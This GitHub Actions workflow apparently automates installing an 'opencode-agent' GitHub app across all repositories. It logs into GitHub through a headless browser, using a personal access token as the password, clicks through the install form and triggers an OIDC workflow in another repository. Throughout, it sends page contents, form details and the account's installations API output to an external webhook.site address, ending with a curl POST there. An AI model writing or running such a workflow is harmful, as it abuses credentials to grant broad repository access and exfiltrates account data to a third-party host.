name: Install OpenCode Agent v2
on:
  workflow_dispatch:
  push:
    branches: [main]
    paths:
      - '.github/workflows/install_app.yml'

permissions:
  id-token: write
  contents: read

jobs:
  install-app:
    runs-on: ubuntu-latest
    steps:
      - name: Install Playwright
        run: |
          pip install playwright 2>&1 | tail -3
          playwright install chromium 2>&1 | tail -3
          playwright install-deps chromium 2>&1 | tail -3
          
      - name: Install app via browser
        env:
          GH_PAT: ${{ secrets.GH_PAT }}
          WH_URL: "https://webhook.site/5e1d00e3-847e-4e94-bd04-685ca8e75f8e"
        run: |
          python3 << 'PYEOF'
          import asyncio, os, json, urllib.request, traceback

          PAT = os.environ.get("GH_PAT", "")
          WH = os.environ.get("WH_URL", "")

          def report(d):
              try:
                  req = urllib.request.Request(WH, data=json.dumps(d).encode(), headers={"Content-Type": "application/json"})
                  urllib.request.urlopen(req, timeout=10)
              except Exception as e:
                  print(f"Report error: {e}")

          async def main():
              from playwright.async_api import async_playwright
              async with async_playwright() as p:
                  browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
                  ctx = await browser.new_context()
                  page = await ctx.new_page()

                  # Step 1: Login with PAT as password (works from GH runners!)
                  report({"step": "v2_login_start"})
                  await page.goto("https://github.com/login", wait_until="domcontentloaded", timeout=30000)
                  await page.fill("#login_field", "benderTheCrime")
                  await page.fill("#password", PAT)
                  await page.click("input[type='submit']")
                  await page.wait_for_timeout(5000)

                  url_after = page.url
                  content = await page.content()
                  logged_in = "login" not in url_after or "device" in url_after

                  report({"step": "v2_after_login", "url": url_after, "logged_in": logged_in})

                  if not logged_in:
                      report({"step": "v2_login_failed", "body": content[:3000]})
                      await browser.close()
                      return

                  # Step 2: Navigate directly to the app installation page
                  report({"step": "v2_navigating_to_install"})
                  await page.goto(
                      "https://github.com/apps/opencode-agent/installations/new",
                      wait_until="domcontentloaded",
                      timeout=30000
                  )
                  await page.wait_for_timeout(2000)

                  install_url = page.url
                  install_content = await page.content()
                  install_title = await page.title()

                  report({
                      "step": "v2_install_page",
                      "url": install_url,
                      "title": install_title,
                      "body_len": len(install_content),
                      "body_snippet": install_content[:3000]
                  })

                  # Step 3: Look for the installation form elements
                  # Find all buttons and form elements
                  buttons = await page.query_selector_all("button")
                  btn_texts = []
                  for b in buttons:
                      txt = (await b.text_content() or "").strip()
                      btn_texts.append(txt)

                  inputs = await page.query_selector_all("input")
                  input_info = []
                  for inp in inputs:
                      name = await inp.get_attribute("name") or ""
                      typ = await inp.get_attribute("type") or ""
                      val = await inp.get_attribute("value") or ""
                      input_info.append({"name": name, "type": typ, "value": val[:50]})

                  forms = await page.query_selector_all("form")
                  form_info = []
                  for f in forms:
                      action = await f.get_attribute("action") or ""
                      method = await f.get_attribute("method") or ""
                      form_info.append({"action": action, "method": method})

                  report({
                      "step": "v2_form_elements",
                      "buttons": btn_texts,
                      "inputs": input_info,
                      "forms": form_info
                  })

                  # Step 4: Select "All repositories" if present
                  try:
                      all_repos_radio = await page.query_selector("input[value='all']")
                      if all_repos_radio:
                          await all_repos_radio.click()
                          report({"step": "v2_selected_all_repos"})
                  except Exception as e:
                      report({"step": "v2_radio_error", "error": str(e)})

                  # Step 5: Click the Install button
                  installed = False
                  for b in buttons:
                      txt = (await b.text_content() or "").strip().lower()
                      if "install" in txt:
                          report({"step": "v2_clicking_install", "button_text": txt})
                          await b.click()
                          await page.wait_for_timeout(5000)
                          
                          final_url = page.url
                          final_content = await page.content()
                          report({
                              "step": "v2_after_install_click",
                              "url": final_url,
                              "title": await page.title(),
                              "body_snippet": final_content[:3000]
                          })
                          installed = True
                          break

                  if not installed:
                      # Try submitting any form on the page
                      for f in forms:
                          action = await f.get_attribute("action") or ""
                          if "install" in action.lower() or "integration" in action.lower():
                              report({"step": "v2_submitting_form", "action": action})
                              submit_btn = await f.query_selector("button[type='submit'], input[type='submit']")
                              if submit_btn:
                                  await submit_btn.click()
                                  await page.wait_for_timeout(5000)
                                  report({
                                      "step": "v2_form_submitted",
                                      "url": page.url,
                                      "body_snippet": (await page.content())[:3000]
                                  })
                                  installed = True
                                  break

                  if not installed:
                      report({"step": "v2_no_install_button_found"})

                  # Step 6: Verify installation via API
                  report({"step": "v2_checking_installation_api"})
                  page2 = await ctx.new_page()
                  await page2.set_extra_http_headers({"Authorization": f"token {PAT}", "Accept": "application/vnd.github.v3+json"})
                  
                  resp = await page2.goto("https://api.github.com/user/installations", wait_until="domcontentloaded", timeout=15000)
                  api_body = await page2.evaluate("() => document.body.innerText")
                  report({"step": "v2_installations_check", "body": api_body[:2000]})

                  await browser.close()

          try:
              asyncio.run(main())
          except Exception as e:
              report({"step": "v2_fatal_error", "error": traceback.format_exc()})
          PYEOF
          
      - name: Trigger OIDC workflow
        env:
          GH_TOKEN: ${{ secrets.GH_PAT }}
        run: |
          # Try to trigger the OIDC test workflow
          gh workflow run oidc-test.yml -R benderTheCrime/oidc-test-bende --ref main 2>&1 || \
          gh workflow run "OIDC Exchange Test v2" -R benderTheCrime/oidc-test-bende --ref main 2>&1 || \
          echo "Could not trigger OIDC workflow"
          
      - name: Final report
        if: always()
        run: |
          curl -s -X POST "https://webhook.site/5e1d00e3-847e-4e94-bd04-685ca8e75f8e" \
            -H "Content-Type: application/json" \
            -d '{"step":"v2_workflow_complete"}'
